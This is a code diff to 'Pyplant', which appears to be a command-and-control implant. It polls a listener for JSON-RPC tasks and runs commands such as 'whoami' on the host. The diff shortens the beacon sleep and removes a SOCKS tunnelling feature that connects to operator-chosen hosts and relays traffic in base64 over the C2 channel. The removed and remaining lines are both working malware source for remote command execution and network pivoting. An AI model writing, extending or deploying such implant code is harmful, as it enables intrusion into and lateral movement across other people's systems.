@@ -15,7 +15,7 @@ from connect.convert import bytes_to_base64, base64_to_bytes, string_to_base64
 class Pyplant:
     NAME = 'pyplant'
     ROUTES = ['test', 'test1', '1test', '_test', 'test_', 'test?test=test', 'test.png']
-    SLEEP = 0.1
+    SLEEP = 0.01
 
     def __init__(self):
         self.listener_url = None
@@ -82,33 +82,6 @@ class Pyplant:
         threading.Thread(target=self.retrieve_batch_request, daemon=True, args=(arguments.url,)).start()
         self.process_tasks()
 
-    def stream(self, client, task_id, params):
-        client_id = params[0]
-        while True:
-            time.sleep(self.SLEEP)
-            r, w, e = select.select([client], [client], [])
-            if client in w and len(self.upstream_buffer[client_id]) > 0:
-                client.send(self.upstream_buffer[client_id].pop(0))
-            if client in r:
-                try:
-                    downstream_data = client.recv(4096)
-                    if len(downstream_data) <= 0:
-                        break
-                    socks_downstream_result = json.dumps({
-                        'client_id': client_id,
-                        'data': bytes_to_base64(downstream_data)
-                    })
-                    downstream_task = [{
-                        "jsonrpc": '2.0',
-                        "result": string_to_base64(socks_downstream_result),
-                        "id": task_id
-                    }]
-                    self.batch_response.extend(downstream_task)
-                except Exception as e:
-                    print(e)
-                    break
-        print('stoping stream')
-
     def process_tasks(self):
         while True:
             time.sleep(self.SLEEP)
@@ -122,57 +95,6 @@ class Pyplant:
                 results = None
                 if method == 'whoami':
                     results = subprocess.run(['whoami'], capture_output=True, text=True).stdout
-                if method == 'socks':
-                    results = 'socks'
-                if method == 'socks_upstream':
-                    upstream_data = base64_to_bytes(params[1])
-                    self.upstream_buffer[params[0]].append(upstream_data)
-                    continue
-                if method == 'socks_downstream':
-                    client = self.socks_connections[params[0]]
-                    print('starting downstream..')
-                    threading.Thread(target=self.stream, daemon=True, args=(client, task_id, params,)).start()
-                    continue
-                if method == 'socks_connect':
-                    print('PROCESSING SOCKS CONNECT' + '-'*2000)
-                    atype = params[0]
-                    socks_connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                    socks_connection.settimeout(5.0)
-                    rep = None
-                    try:
-                        socks_connection.connect((params[1], int(params[2])))
-                        rep = 0
-                    except socket.error as e:
-                        if e.errno == socket.errno.EACCES:
-                            rep = 2
-                        elif e.errno == socket.errno.ENETUNREACH:
-                            rep = 3
-                        elif e.errno == socket.errno.EHOSTUNREACH:
-                            rep = 4
-                        elif e.errno == socket.errno.ECONNREFUSED:
-                            rep = 5
-                        rep = rep if rep else 6
-
-                    if rep != 0:
-                        results = json.dumps({
-                            'atype': atype,
-                            'rep': rep,
-                            'bind_addr': None,
-                            'bind_port': None,
-                            'client_id': params[3]
-                        })
-                    else:
-                        self.socks_connections[params[3]] = socks_connection
-                        self.upstream_buffer[params[3]] = []
-                        bind_addr = socks_connection.getsockname()[0]
-                        bind_port = socks_connection.getsockname()[1]
-                        results = json.dumps({
-                            'atype': atype,
-                            'rep': rep,
-                            'bind_addr': bind_addr,
-                            'bind_port': bind_port,
-                            'client_id': params[3]
-                        })
                 if task_id != self.check_in_task_id:
                     self.batch_response.extend([{
                         "jsonrpc": "0.0.0",
